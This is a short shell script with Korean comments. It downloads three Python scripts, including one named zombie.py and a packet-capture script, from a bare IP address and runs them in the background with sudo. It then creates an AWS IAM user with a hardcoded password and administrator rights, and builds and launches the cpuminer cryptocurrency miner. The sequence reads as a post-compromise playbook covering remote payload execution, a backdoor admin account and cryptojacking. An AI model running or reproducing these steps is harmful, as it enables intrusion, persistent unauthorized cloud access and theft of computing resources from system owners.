#파일 다운로드
wget 222.96.227.76:8080/upload/zombie.py

wget 222.96.227.76:8080/upload/web_user_log.py

wget 222.96.227.76:8080/upload/pcap.py

# 1. zombie.py 스크립트 실행
nohup sudo python3 zombie.py &

nohup sudo python3 web_user_log.py &

nohup sudo python3 pcap.py &

# 2. iam user생성
aws iam create-user --user-name ExampleUser

aws iam attach-user-policy --user-name ExampleUser --policy-arn arn:aws:iam::aws:policy/IAMUserChangePassword

aws iam create-login-profile --user-name ExampleUser --password Password123! --password-reset-required

aws iam attach-user-policy --user-name ExampleUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. 필요한 패키지 설치
sudo yum install -y g++ zlib-devel git gcc make autoconf automake libtool libcurl-devel openssl-devel

git clone https://github.com/tpruvot/cpuminer-multi

cd cpuminer-multi

./build.sh

./cpuminer &

